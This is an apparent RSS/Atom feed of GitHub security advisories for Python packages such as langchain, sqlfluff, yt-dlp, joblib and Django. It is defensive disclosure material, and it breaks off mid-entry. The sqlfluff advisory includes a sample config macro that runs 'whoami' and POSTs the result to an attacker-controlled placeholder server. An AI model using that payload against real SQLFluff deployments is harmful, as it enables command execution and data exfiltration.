<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2023-07-06T22:01:30.593Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[langchain] langchain SQL Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7q94-qpjr-xpgm</id>
        <link href="https://github.com/advisories/GHSA-7q94-qpjr-xpgm"/>
        <updated>2023-07-06T21:11:07.000Z</updated>
        <content type="html"><![CDATA[<p>SQL injection vulnerability in langchain allows a remote attacker to obtain sensitive information via the SQLDatabaseChain component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36189">https://nvd.nist.gov/vuln/detail/CVE-2023-36189</a></li>
<li><a href="https://github.com/hwchase17/langchain/issues/5923">https://github.com/hwchase17/langchain/issues/5923</a></li>
<li><a href="https://github.com/hwchase17/langchain/pull/6051">https://github.com/hwchase17/langchain/pull/6051</a></li>
<li><a href="https://github.com/advisories/GHSA-7q94-qpjr-xpgm">https://github.com/advisories/GHSA-7q94-qpjr-xpgm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7q94-qpjr-xpgm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-06T15:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain] langchain vulnerable to arbitrary code execution]]></title>
        <id>https://github.com/advisories/GHSA-57fc-8q82-gfp3</id>
        <link href="https://github.com/advisories/GHSA-57fc-8q82-gfp3"/>
        <updated>2023-07-06T21:08:41.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in langchain allows a remote attacker to execute arbitrary code via the PALChain parameter in the Python exec method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36188">https://nvd.nist.gov/vuln/detail/CVE-2023-36188</a></li>
<li><a href="https://github.com/hwchase17/langchain/issues/5872">https://github.com/hwchase17/langchain/issues/5872</a></li>
<li><a href="https://github.com/hwchase17/langchain/pull/6003">https://github.com/hwchase17/langchain/pull/6003</a></li>
<li><a href="https://github.com/advisories/GHSA-57fc-8q82-gfp3">https://github.com/advisories/GHSA-57fc-8q82-gfp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-57fc-8q82-gfp3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-06T15:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sqlfluff] SQLFluff users with access to config file, using `libary_path` may call arbitrary python code]]></title>
        <id>https://github.com/advisories/GHSA-jqhc-m2j3-fjrx</id>
        <link href="https://github.com/advisories/GHSA-jqhc-m2j3-fjrx"/>
        <updated>2023-07-06T21:06:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In environments where untrusted users have access to the config files (e.g. <code>.sqlfluff</code>), there is a potential security vulnerability where those users could use the <code>library_path</code> config value to allow arbitrary python code to be executed via macros. Jinja macros are executed within a <a href="https://docs.snowflake.com/en/sql-reference/sql/show-warehouses">sandboxed environment</a> but the following example shows how an external url might be called and used to reveal internal information to an external listener:</p>
<pre><code class="language-ini">[sqlfluff:templater:jinja]
library_path = /usr/lib/python3.9/http

[sqlfluff:templater:jinja:macros]
a_macro_def = {{client.HTTPSConnection('&lt;SOME_EXTERNAL_SERVER_YOU_CONTROL&gt;').request('POST', '/', server.os.popen('whoami').read())}}
</code></pre>
<p>For many users who use SQLFluff in the context of an environment where all users <em>already have fairly escalated privileges</em>, this may not be an issue - however in larger user bases, or where SQLFluff is bundled into another tool where developers still wish to give users access to supply their on <em>rule configuration</em>, this may be an issue.</p>
<h3 id="patches">Patches</h3>
<p>The 2.1.2 release offers the ability for the <code>library_path</code> argument to be overwritten on the command line by using <a href="https://docs.sqlfluff.com/en/stable/cli.html#cmdoption-sqlfluff-lint-library-path">the <code>--library-path</code> option</a>. This overrides any values provided in the config files and effectively prevents this route of attack for users which have access to the config file, but not to the scripts which call the SQLFluff CLI directly. A similar option is provided for the Python API, where users also have a greater ability to further customise or override configuration as necessary. </p>
<p>Unless <code>library_path</code> is explicitly required, we recommend using the option <code>--library-path none</code> when invoking SQLFluff which will disable the <code>library-path</code> option entirely regardless of the options set in the configuration file or via inline config directives.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Limiting access to - or otherwise validating configuration files before they are ingested by SQLFluff will provide a similar effect and does not require upgrade.</p>
<h3 id="credit">Credit</h3>
<p>Dan Amodio from the Tinder Red Team</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sqlfluff/sqlfluff/security/advisories/GHSA-jqhc-m2j3-fjrx">https://github.com/sqlfluff/sqlfluff/security/advisories/GHSA-jqhc-m2j3-fjrx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36830">https://nvd.nist.gov/vuln/detail/CVE-2023-36830</a></li>
<li><a href="https://github.com/sqlfluff/sqlfluff/commit/6cdc38d76bedab4801b035c04d3c2b3aea17de86">https://github.com/sqlfluff/sqlfluff/commit/6cdc38d76bedab4801b035c04d3c2b3aea17de86</a></li>
<li><a href="https://github.com/sqlfluff/sqlfluff/releases/tag/2.1.2">https://github.com/sqlfluff/sqlfluff/releases/tag/2.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-jqhc-m2j3-fjrx">https://github.com/advisories/GHSA-jqhc-m2j3-fjrx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jqhc-m2j3-fjrx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-06T21:05:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scipy] scipy memory leak vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-9jx5-6pgf-crrp</id>
        <link href="https://github.com/advisories/GHSA-9jx5-6pgf-crrp"/>
        <updated>2023-07-06T21:01:58.000Z</updated>
        <content type="html"><![CDATA[<p>A refcounting issue which leads to potential memory leak was discovered in scipy commit 8627df31ab in <code>Py_FindObjects()</code> function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25399">https://nvd.nist.gov/vuln/detail/CVE-2023-25399</a></li>
<li><a href="https://github.com/scipy/scipy/issues/16235">https://github.com/scipy/scipy/issues/16235</a></li>
<li><a href="https://github.com/scipy/scipy/pull/16397">https://github.com/scipy/scipy/pull/16397</a></li>
<li><a href="http://www.square16.org/achievement/cve-2023-25399/">http://www.square16.org/achievement/cve-2023-25399/</a></li>
<li><a href="https://github.com/scipy/scipy/commit/9b6521198c4f31d3f9cb525e581bea8e3e77f0a2">https://github.com/scipy/scipy/commit/9b6521198c4f31d3f9cb525e581bea8e3e77f0a2</a></li>
<li><a href="https://github.com/advisories/GHSA-9jx5-6pgf-crrp">https://github.com/advisories/GHSA-9jx5-6pgf-crrp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jx5-6pgf-crrp</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-07-05T18:30:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ethyca-fides] ethyca-fides Webserver API Path Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-r25m-cr6v-p9hq</id>
        <link href="https://github.com/advisories/GHSA-r25m-cr6v-p9hq"/>
        <updated>2023-07-06T20:40:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A path traversal (directory traversal) vulnerability affects fides versions lower than <code>2.15.1</code>, allowing remote attackers to access arbitrary files on the fides webserver container's filesystem.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability is patched in fides <code>2.15.1</code>. Users should upgrade to this version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If the Fides webserver API is not directly accessible to attackers and is instead deployed behind a reverse proxy as recommended in Ethyca's <a href="https://docs.ethyca.com/docs/configuration/security-practices#reverse-proxy">security best practice documentation</a>, and the reverse proxy is an AWS application load balancer, the vulnerability can't be exploited by these attackers. An AWS application load balancer will reject this attack with a 400 error.</p>
<p>Additionally, any secrets supplied to the container using environment variables rather than a <code>fides.toml</code> configuration file are not affected by this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ethyca/fides/security/advisories/GHSA-r25m-cr6v-p9hq">https://github.com/ethyca/fides/security/advisories/GHSA-r25m-cr6v-p9hq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36827">https://nvd.nist.gov/vuln/detail/CVE-2023-36827</a></li>
<li><a href="https://github.com/ethyca/fides/commit/f526d9ffb176006d701493c9d0eff6b4884e811f">https://github.com/ethyca/fides/commit/f526d9ffb176006d701493c9d0eff6b4884e811f</a></li>
<li><a href="https://github.com/ethyca/fides/releases/tag/2.15.1">https://github.com/ethyca/fides/releases/tag/2.15.1</a></li>
<li><a href="https://github.com/advisories/GHSA-r25m-cr6v-p9hq">https://github.com/advisories/GHSA-r25m-cr6v-p9hq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r25m-cr6v-p9hq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-06T20:40:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yt-dlp] yt-dlp File Downloader cookie leak]]></title>
        <id>https://github.com/advisories/GHSA-v8mc-9377-rwjj</id>
        <link href="https://github.com/advisories/GHSA-v8mc-9377-rwjj"/>
        <updated>2023-07-06T21:39:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>During file downloads, yt-dlp or the external downloaders that yt-dlp employs may leak cookies on HTTP redirects to a different host, or leak them when the host for download fragments differs from their parent manifest's host.</p>
<p>This vulnerable behavior is present in all versions of <a href="https://github.com/ytdl-org/youtube-dl">youtube-dl</a>, <a href="https://github.com/blackjack4494/yt-dlc">youtube-dlc</a> and <a href="https://github.com/yt-dlp/yt-dlp">yt-dlp</a> released since 2015.01.25. All native and external downloaders are affected, except for <code>curl</code> and <code>httpie</code> (httpie version 3.1.0 or later).</p>
<p>At the file download stage, all cookies are passed by yt-dlp to the file downloader as a <code>Cookie</code> header, thereby losing their scope. This also occurs in yt-dlp's info JSON output, which may be used by external tools. As a result, the downloader or external tool may indiscriminately send cookies with requests to domains or paths for which the cookies are not scoped.</p>
<p>An example of a potential attack scenario exploiting this vulnerability:</p>
<ol>
<li>an attacker has crafted a malicious website with an embedded URL designed to be detected by yt-dlp as a video download. This embedded URL has the domain of a trusted site that the user has loaded cookies for, and conducts an <a href="https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html">unvalidated redirect</a> to a target URL.</li>
<li>yt-dlp extracts this URL and calculates a <code>Cookie</code> header based on its domain for the file downloader to make its request(s) with.</li>
<li>the download URL redirects to a server controlled by the attacker, to which yt-dlp forwards the user's sensitive cookie information.</li>
</ol>
<h3 id="patches">Patches</h3>
<p>yt-dlp version 2023.07.06 fixes this issue by doing the following:</p>
<ul>
<li>Remove the <code>Cookie</code> header upon HTTP redirects</li>
<li>Have native downloaders calculate their own <code>Cookie</code> header from the cookiejar</li>
<li>Utilize external downloaders' built-in support for cookies instead of passing them as header arguments</li>
<li>If the external downloader does not have proper cookie support, then disable HTTP redirection (<code>axel</code> only)</li>
<li>Process cookies passed as HTTP headers to limit their scope (<code>--add-header "Cookie:..."</code> is scoped to input URL domain only)</li>
<li>Store cookies in a separate <code>cookies</code> field of the info dict instead of <code>http_headers</code> so as not to lose their scope</li>
</ul>
<p>Patches for youtube-dl are expected and we will update this advisory when they are merged.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It is recommended to upgrade yt-dlp to version 2023.07.06 as soon as possible.</p>
<p>For users who are not able to upgrade:</p>
<ul>
<li>Avoid using cookies and user authentication methods (<code>--cookies</code>, <code>--cookies-from-browser</code>, <code>--username</code>, <code>--password</code>, <code>--netrc</code>). While extractors may set custom cookies, these usually do not contain sensitive information.</li>
<li>Avoid using <code>--load-info-json</code></li>
</ul>
<p>Or, if authentication is a must:</p>
<ul>
<li>Verify the integrity of download links from unknown sources in browser (including redirects) before passing them to yt-dlp</li>
<li>Use <code>curl</code> as external downloader, since it is not impacted (<code>--downloader curl</code>)</li>
<li>Avoid fragmented formats such as HLS/m3u8, DASH/mpd and ISM (use <code>-f "(bv*+ba/b)[protocol~='^https?$']"</code>)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-v8mc-9377-rwjj">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-v8mc-9377-rwjj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35934">https://nvd.nist.gov/vuln/detail/CVE-2023-35934</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2023.07.06">https://github.com/yt-dlp/yt-dlp/releases/tag/2023.07.06</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2023.07.06.185519">https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2023.07.06.185519</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/1ceb657bdd254ad961489e5060f2ccc7d556b729">https://github.com/yt-dlp/yt-dlp/commit/1ceb657bdd254ad961489e5060f2ccc7d556b729</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/f8b4bcc0a791274223723488bfbfc23ea3276641">https://github.com/yt-dlp/yt-dlp/commit/f8b4bcc0a791274223723488bfbfc23ea3276641</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/3121512228487c9c690d3d39bfd2579addf96e07">https://github.com/yt-dlp/yt-dlp/commit/3121512228487c9c690d3d39bfd2579addf96e07</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-v8mc-9377-rwjj">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-v8mc-9377-rwjj</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/1ceb657bdd254ad961489e5060f2ccc7d556b729">https://github.com/yt-dlp/yt-dlp/commit/1ceb657bdd254ad961489e5060f2ccc7d556b729</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/3121512228487c9c690d3d39bfd2579addf96e07">https://github.com/yt-dlp/yt-dlp/commit/3121512228487c9c690d3d39bfd2579addf96e07</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/f8b4bcc0a791274223723488bfbfc23ea3276641">https://github.com/yt-dlp/yt-dlp/commit/f8b4bcc0a791274223723488bfbfc23ea3276641</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2023.07.06.185519">https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2023.07.06.185519</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2023.07.06">https://github.com/yt-dlp/yt-dlp/releases/tag/2023.07.06</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35934">https://nvd.nist.gov/vuln/detail/CVE-2023-35934</a></li>
<li><a href="https://github.com/advisories/GHSA-v8mc-9377-rwjj">https://github.com/advisories/GHSA-v8mc-9377-rwjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8mc-9377-rwjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-06T19:47:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[joblib] joblib vulnerable to arbitrary code execution]]></title>
        <id>https://github.com/advisories/GHSA-6hrg-qmvc-2xh8</id>
        <link href="https://github.com/advisories/GHSA-6hrg-qmvc-2xh8"/>
        <updated>2023-07-06T19:33:38.000Z</updated>
        <content type="html"><![CDATA[<p>The package joblib from 0 and before 1.2.0 is vulnerable to Arbitrary Code Execution via the <code>pre_dispatch</code> flag in <code>Parallel()</code> class due to the <code>eval()</code> statement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-21797">https://nvd.nist.gov/vuln/detail/CVE-2022-21797</a></li>
<li><a href="https://github.com/joblib/joblib/issues/1128">https://github.com/joblib/joblib/issues/1128</a></li>
<li><a href="https://github.com/joblib/joblib/pull/1321">https://github.com/joblib/joblib/pull/1321</a></li>
<li><a href="https://github.com/joblib/joblib/commit/b90f10efeb670a2cc877fb88ebb3f2019189e059">https://github.com/joblib/joblib/commit/b90f10efeb670a2cc877fb88ebb3f2019189e059</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-JOBLIB-3027033">https://security.snyk.io/vuln/SNYK-PYTHON-JOBLIB-3027033</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BVOMMW37OXZWU2EV5ONAAS462IQEHZOF/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BVOMMW37OXZWU2EV5ONAAS462IQEHZOF/</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2022/11/msg00020.html">https://lists.debian.org/debian-lts-announce/2022/11/msg00020.html</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MJ5XTJS6OKJRRVXWFN5J67K3BYPEOBDF/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MJ5XTJS6OKJRRVXWFN5J67K3BYPEOBDF/</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/03/msg00027.html">https://lists.debian.org/debian-lts-announce/2023/03/msg00027.html</a></li>
<li><a href="https://github.com/joblib/joblib/pull/1327">https://github.com/joblib/joblib/pull/1327</a></li>
<li><a href="https://github.com/joblib/joblib/pull/1352">https://github.com/joblib/joblib/pull/1352</a></li>
<li><a href="https://github.com/joblib/joblib/commit/6638b9e9711ad1ebbf6dd95aa7cee0dca9897b42">https://github.com/joblib/joblib/commit/6638b9e9711ad1ebbf6dd95aa7cee0dca9897b42</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/joblib/PYSEC-2022-288.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/joblib/PYSEC-2022-288.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-6hrg-qmvc-2xh8">https://github.com/advisories/GHSA-6hrg-qmvc-2xh8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hrg-qmvc-2xh8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-09-27T00:00:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain] langchain arbitrary code execution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2qmj-7962-cjq8</id>
        <link href="https://github.com/advisories/GHSA-2qmj-7962-cjq8"/>
        <updated>2023-07-06T15:11:25.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in langchain allows an attacker to execute arbitrary code via the PALChain in the python exec method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36258">https://nvd.nist.gov/vuln/detail/CVE-2023-36258</a></li>
<li><a href="https://github.com/hwchase17/langchain/issues/5872">https://github.com/hwchase17/langchain/issues/5872</a></li>
<li><a href="https://github.com/hwchase17/langchain/pull/6003">https://github.com/hwchase17/langchain/pull/6003</a></li>
<li><a href="https://github.com/advisories/GHSA-2qmj-7962-cjq8">https://github.com/advisories/GHSA-2qmj-7962-cjq8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qmj-7962-cjq8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-03T21:30:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django has regular expression denial of service vulnerability in EmailValidator/URLValidator]]></title>
        <id>https://github.com/advisories/GHSA-jh3w-4vvf-mjgr</id>
        <link href="https://github.com/advisories/GHSA-jh3w-4vvf-mjgr"/>
        <updated>2023-07-05T22:45:56.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.20, 4 before 4.1.10, and 4.2 before 4.2.3, <code>EmailValidator</code> and <code>URLValidator</code> are subject to a potential ReDoS (regular expression denial of service) attack via a very large number of domain name labels of emails and URLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36053">https://nvd.nist.gov/vuln/detail/CVE-2023-36053</a></li>
<li><a href="https://docs.djangoproject.com/en/4.2/releases/security/">https://docs.djangoproject.com/en/4.2/releases/security/</a></li>
<li><a href="https://groups.google.com/forum/#!forum/django-announce">https://groups.google.com/forum/#!forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2023/jul/03/security-releases/">https://www.djangoproject.com/weblog/2023/jul/03/security-releases/</a></li>
<li><a href="https://github.com/django/django/commit/454f2fb93437f98917283336201b4048293f7582">https://github.com/django/django/commit/454f2fb93437f98917283336201b4048293f7582</a></li>
<li><a href="https://github.com/django/django/commit/ad0410ec4f458aa39803e5f6b9a3736527062dcd">https://github.com/django/django/commit/ad0410ec4f458aa39803e5f6b9a3736527062dcd</a></li>
<li><a href="https://github.com/django/django/commit/b7c5feb35a31799de6e582ad6a5a91a9de74e0f9">https://github.com/django/django/commit/b7c5feb35a31799de6e582ad6a5a91a9de74e0f9</a></li>
<li><a href="https://github.com/django/django/commit/beb3f3d55940d9aa7198bf9d424ab74e873aec3d">https://github.com/django/django/commit/beb3f3d55940d9aa7198bf9d424ab74e873aec3d</a></li>
<li><a href="https://github.com/advisories/GHSA-jh3w-4vvf-mjgr">https://github.com/advisories/GHSA-jh3w-4vvf-mjgr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh3w-4vvf-mjgr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-03T15:30:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django has regular expression denial of service vulnerability in EmailValidator/URLValidator]]></title>
        <id>https://github.com/advisories/GHSA-jh3w-4vvf-mjgr</id>
        <link href="https://github.com/advisories/GHSA-jh3w-4vvf-mjgr"/>
        <updated>2023-07-05T22:45:56.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.20, 4 before 4.1.10, and 4.2 before 4.2.3, <code>EmailValidator</code> and <code>URLValidator</code> are subject to a potential ReDoS (regular expression denial of service) attack via a very large number of domain name labels of emails and URLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36053">https://nvd.nist.gov/vuln/detail/CVE-2023-36053</a></li>
<li><a href="https://docs.djangoproject.com/en/4.2/releases/security/">https://docs.djangoproject.com/en/4.2/releases/security/</a></li>
<li><a href="https://groups.google.com/forum/#!forum/django-announce">https://groups.google.com/forum/#!forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2023/jul/03/security-releases/">https://www.djangoproject.com/weblog/2023/jul/03/security-releases/</a></li>
<li><a href="https://github.com/django/django/commit/454f2fb93437f98917283336201b4048293f7582">https://github.com/django/django/commit/454f2fb93437f98917283336201b4048293f7582</a></li>
<li><a href="https://github.com/django/django/commit/ad0410ec4f458aa39803e5f6b9a3736527062dcd">https://github.com/django/django/commit/ad0410ec4f458aa39803e5f6b9a3736527062dcd</a></li>
<li><a href="https://github.com/django/django/commit/b7c5feb35a31799de6e582ad6a5a91a9de74e0f9">https://github.com/django/django/commit/b7c5feb35a31799de6e582ad6a5a91a9de74e0f9</a></li>
<li><a href="https://github.com/django/django/commit/beb3f3d55940d9aa7198bf9d424ab74e873aec3d">https://github.com/django/django/commit/beb3f3d55940d9aa7198bf9d424ab74e873aec3d</a></li>
<li><a href="https://github.com/advisories/GHSA-jh3w-4vvf-mjgr">https://github.com/advisories/GHSA-jh3w-4vvf-mjgr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh3w-4vvf-mjgr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-03T15:30:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django has regular expression denial of service vulnerability in EmailValidator/URLValidator]]></title>
        <id>https://github.com/advisories/GHSA-jh3w-4vvf-mjgr</id>
        <link href="https://github.com/advisories/GHSA-jh3w-4vvf-mjgr"/>
        <updated>2023-07-05T22:45:56.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.20, 4 before 4.1.10, and 4.2 before 4.2.3, <code>EmailValidator</code> and <code>URLValidator</code> are subject to a potential ReDoS (regular expression denial of service) attack via a very large number of domain name labels of emails and URLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36053">https://nvd.nist.gov/vuln/detail/CVE-2023-36053</a></li>
<li><a href="https://docs.djangoproject.com/en/4.2/releases/security/">https://docs.djangoproject.com/en/4.2/releases/security/</a></li>
<li><a href="https://groups.google.com/forum/#!forum/django-announce">https://groups.google.com/forum/#!forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2023/jul/03/security-releases/">https://www.djangoproject.com/weblog/2023/jul/03/security-releases/</a></li>
<li><a href="https://github.com/django/django/commit/454f2fb93437f98917283336201b4048293f7582">https://github.com/django/django/commit/454f2fb93437f98917283336201b4048293f7582</a></li>
<li><a href="https://github.com/django/django/commit/ad0410ec4f458aa39803e5f6b9a3736527062dcd">https://github.com/django/django/commit/ad0410ec4f458aa39803e5f6b9a3736527062dcd</a></li>
<li><a href="https://github.com/django/django/commit/b7c5feb35a31799de6e582ad6a5a91a9de74e0f9">https://github.com/django/django/commit/b7c5feb35a31799de6e582ad6a5a91a9de74e0f9</a></li>
<li><a href="https://github.com/django/django/commit/beb3f3d55940d9aa7198bf9d424ab74e873aec3d">https://github.com/django/django/commit/beb3f3d55940d9aa7198bf9d424ab74e873aec3d</a></li>
<li><a href="https://github.com/advisories/GHSA-jh3w-4vvf-mjgr">https://github.com/advisories/GHSA-jh3w-4vvf-mjgr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh3w-4vvf-mjgr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-03T15:30:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-apache-hive] Apache Airflow Hive Provider Beeline remote code execution with Principal]]></title>
        <id>https://github.com/advisories/GHSA-hg6c-qqcm-r79r</id>
        <link href="https://github.com/advisories/GHSA-hg6c-qqcm-r79r"/>
        <updated>2023-07-05T22:45:07.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Input Validation vulnerability in Apache Software Foundation Apache Airflow Hive Provider.
This issue affects Apache Airflow Apache Hive Provider: before 6.1.1.</p>
<p>Before version 6.1.1 it was&nbsp;possible to bypass the security check to RCE via
principal parameter. For this to be&nbsp;exploited it requires access to modifying the connection details.</p>
<p>It is recommended updating provider version to 6.1.1 in order to avoid this&nbsp;vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35797">https://nvd.nist.gov/vuln/detail/CVE-2023-35797</a></li>
<li><a href="https://github.com/apache/airflow/pull/31983">https://github.com/apache/airflow/pull/31983</a></li>
<li><a href="https://lists.apache.org/thread/30y19ok07fw52x5hnkbhwqo3ho0wwc1y">https://lists.apache.org/thread/30y19ok07fw52x5hnkbhwqo3ho0wwc1y</a></li>
<li><a href="https://github.com/apache/airflow/commit/6724eeb6210d5965937eaf9dae3e476eb30f8268">https://github.com/apache/airflow/commit/6724eeb6210d5965937eaf9dae3e476eb30f8268</a></li>
<li><a href="https://github.com/advisories/GHSA-hg6c-qqcm-r79r">https://github.com/advisories/GHSA-hg6c-qqcm-r79r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hg6c-qqcm-r79r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-03T12:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Products.CMFCore] Products.CMFCore unauthenticated denial of service and crash via unchecked use of input with Python's marshal module]]></title>
        <id>https://github.com/advisories/GHSA-4hpj-8rhv-9x87</id>
        <link href="https://github.com/advisories/GHSA-4hpj-8rhv-9x87"/>
        <updated>2023-07-05T22:42:09.000Z</updated>
